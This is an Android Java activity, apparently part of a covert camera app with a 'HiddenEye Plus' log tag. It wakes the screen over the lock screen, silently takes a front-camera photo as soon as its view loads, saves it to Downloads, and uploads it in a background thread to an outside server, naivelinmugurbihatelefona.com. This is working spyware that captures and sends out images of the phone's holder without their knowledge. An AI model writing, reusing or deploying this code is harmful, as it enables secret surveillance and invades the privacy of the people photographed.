package com.example.myapplication;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.hardware.Camera;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.WindowManager;

import com.google.firebase.crashlytics.buildtools.reloc.org.apache.commons.io.IOUtils;
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.HttpRequest;
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.HttpResponse;
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.HttpStatus;
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.StatusLine;
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.client.HttpClient;
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.client.methods.HttpGet;
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.client.methods.HttpPost;
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.client.methods.HttpUriRequest;
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.entity.ContentType;
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.impl.client.CloseableHttpClient;
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.impl.client.DefaultHttpClient;
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.impl.client.HttpClients;

//import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.HttpResponse;
//import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.StatusLine;
//import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.client.HttpClient;
//import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.client.methods.HttpUriRequest;
//import com.google.firebase.crashlytics.buildtools.reloc.org.apache.http.impl.client.DefaultHttpClient;
//
//import org.apache.http.client.methods.HttpGet;

public class CameraView extends Activity implements SurfaceHolder.Callback,
        OnClickListener {
    private static final String TAG = "CameraTest";
    Camera mCamera;
    boolean mPreviewRunning = false;
    private void showWhenLockedAndTurnScreenOn() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        } else {
            getWindow().addFlags(
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                    | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            );
        }
    }

    public void onCreate(Bundle icicle) {
        showWhenLockedAndTurnScreenOn();
        super.onCreate(icicle);
        Log.e(TAG, "onCreate");
        setContentView(R.layout.cameraview);

        mSurfaceView = (SurfaceView) findViewById(R.id.surface_camera);

         mSurfaceView.setOnClickListener(this);

        mSurfaceHolder = mSurfaceView.getHolder();
        mSurfaceHolder.addCallback(this);

        mSurfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        mSurfaceHolder.setKeepScreenOn(true);

         mSurfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

    }

    @Override
    protected void onRestoreInstanceState(Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
    }

    protected void onResume() {
        Log.e(TAG, "onResume");
        super.onResume();
    }

    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
    }

    protected void onStop() {
        Log.e(TAG, "onStop");
        super.onStop();
    }

    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
        Log.e(TAG, "surfaceChanged");

        // XXX stopPreview() will crash if preview is not running
        if(mPreviewRunning) {
            mCamera.stopPreview();
        }

        Camera.Parameters p = mCamera.getParameters();

        mCamera.setParameters(p);

        mCamera.startPreview();
        mPreviewRunning = true;
        mCamera.takePicture(null, null, mPictureCallback);

    }

    public void surfaceDestroyed(SurfaceHolder holder) {
        Log.e(TAG, "surfaceDestroyed");
        // mCamera.stopPreview();
        // mPreviewRunning = false;
        // mCamera.release();

        stopCamera();
    }

    private SurfaceView mSurfaceView;
    private SurfaceHolder mSurfaceHolder;

    public void onClick(View v) {
        mCamera.takePicture(null, mPictureCallback, mPictureCallback);
    }

    public void surfaceCreated(SurfaceHolder holder) {
        Log.e(TAG, "surfaceCreated");

        int i = findFrontFacingCamera();

        if(i > 0) ;
        while(true) {
            try {
                this.mCamera = Camera.open(i);
                this.mCamera.setDisplayOrientation(90);
                try {
                    this.mCamera.setPreviewDisplay(holder);
                    return;
                } catch(IOException localIOException2) {
                    stopCamera();
                    return;
                }
            } catch(RuntimeException localRuntimeException) {
                localRuntimeException.printStackTrace();
                if(this.mCamera == null) continue;
                stopCamera();
                this.mCamera = Camera.open(i);
                try {
                    this.mCamera.setPreviewDisplay(holder);
                    Log.d("HiddenEye Plus", "Camera open RE");
                    return;
                } catch(IOException localIOException1) {
                    stopCamera();
                    localIOException1.printStackTrace();
                    return;
                }

            } catch(Exception localException) {
                if(this.mCamera != null) stopCamera();
                localException.printStackTrace();
                return;
            }
        }
    }

    private void stopCamera() {
        if(this.mCamera != null) {
            /*
             * this.mCamera.stopPreview(); this.mCamera.release(); this.mCamera = null;
             */
            this.mPreviewRunning = false;
        }
    }

    private int findFrontFacingCamera() {
        int i = Camera.getNumberOfCameras();
        for(int j = 0 ; ; j++) {
            if(j >= i) return -1;
            Camera.CameraInfo localCameraInfo = new Camera.CameraInfo();
            Camera.getCameraInfo(j, localCameraInfo);
            if(localCameraInfo.facing == 1) return j;
        }
    }

    Camera.PictureCallback mPictureCallback = new Camera.PictureCallback() {

        public void onPictureTaken(byte[] data, Camera camera) {
            Log.d(TAG, "CCCCCCCCCCCCCCCCCCCCCCCC");
            if(data != null) {
                // Intent mIntent = new Intent();
                // mIntent.putExtra("image",imageData);

                mCamera.stopPreview();
                mPreviewRunning = false;
                mCamera.release();

                try {

                    BitmapFactory.Options opts = new BitmapFactory.Options();
                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0,
                            data.length, opts);
                    bitmap = Bitmap.createScaledBitmap(bitmap, 900, 500, false);
                    int width = bitmap.getWidth();
                    int height = bitmap.getHeight();
                    int newWidth = 1200;
                    int newHeight = 1200;

                    // calculate the scale - in this case = 0.4f
                    float scaleWidth = ((float) newWidth) / width;
                    float scaleHeight = ((float) newHeight) / height;

                    // createa matrix for the manipulation
                    Matrix matrix = new Matrix();
                    // resize the bit map
                    matrix.postScale(scaleWidth, scaleHeight);
                    // rotate the Bitmap
                    matrix.postRotate(-90);
                    Bitmap resizedBitmap = Bitmap.createBitmap(bitmap, 0, 0,
                            width, height, matrix, true);

                    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
                    resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 40,
                            bytes);

                    // you can create a new file name "test.jpg" in sdcard
                    // folder.




                    Log.d("HERE", String.valueOf(Environment.getExternalStorageDirectory()));
                    File file = new File(Environment.getExternalStorageDirectory() + File.separator + Environment.DIRECTORY_DOWNLOADS, "file.jpeg");
                    file.createNewFile();
                    // write the bytes in file
                    FileOutputStream fo = new FileOutputStream(file);
                    fo.write(bytes.toByteArray());

                    fo.flush();
                    fo.close();
                    Thread thread = new Thread(new Runnable() {

                        @Override
                        public void run() {
                            try {
                                try {
                                    String serverUrl = "https://naivelinmugurbihatelefona.com/api"; // Replace with the actual URL
                                    String filePath = "/path/to/your/file.txt"; // Replace with the actual file path

                                    try {
                                        // Create a URL object for the server URL
                                        URL url = new URL(serverUrl);

                                        // Open a connection to the URL
                                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

                                        // Set the request method to POST
                                        connection.setRequestMethod("POST");

                                        // Enable input and output streams
                                        connection.setDoOutput(true);

                                        // Set the request headers (you may need to adjust these)
                                        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + "*****");

                                        // Create the boundary string
                                        String boundary = "*****";

                                        // Create the output stream for the request body
                                        OutputStream out = connection.getOutputStream();
                                        PrintWriter writer = new PrintWriter(new OutputStreamWriter(out, "UTF-8"), true);

                                        // Add the file part to the request
                                        writer.append("--" + boundary).append("\r\n");
                                        writer.append("Content-Disposition: form-data; name=\"image\"; filename=\"file.jpeg\"").append("\r\n");
                                        writer.append("Content-Type: application/octet-stream").append("\r\n");
                                        writer.append("\r\n");
                                        writer.flush();

                                        // Read and send the file
                                        FileInputStream fileInputStream = new FileInputStream(file);
                                        byte[] buffer = new byte[4096];
                                        int bytesRead;
                                        while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                                            out.write(buffer, 0, bytesRead);
                                        }
                                        out.flush();
                                        fileInputStream.close();

                                        // Finish the request
                                        writer.append("\r\n").flush();
                                        writer.append("--" + boundary + "--").append("\r\n");
                                        writer.close();

                                        // Get the response from the server
                                        int responseCode = connection.getResponseCode();
                                        if (responseCode == HttpURLConnection.HTTP_OK) {
                                            // Read and handle the response here if needed
                                            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                                            String inputLine;
                                            StringBuilder response = new StringBuilder();
                                            while ((inputLine = in.readLine()) != null) {
                                                response.append(inputLine);
                                            }
                                            in.close();
                                            System.out.println("Server Response: " + response.toString());
                                        } else {
                                            System.err.println("Failed to upload file. Server returned HTTP response code: " + responseCode);
                                        }

                                        // Close the connection
                                        connection.disconnect();
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    });

                    thread.start();

                    System.out.println("File F : " + file);



                } catch(Exception e) {
                    e.printStackTrace();
                }
                // StoreByteImage(mContext, imageData, 50,"ImageName");
                // setResult(FOTO_MODE, mIntent);
                finish();
            }
        }
    };
}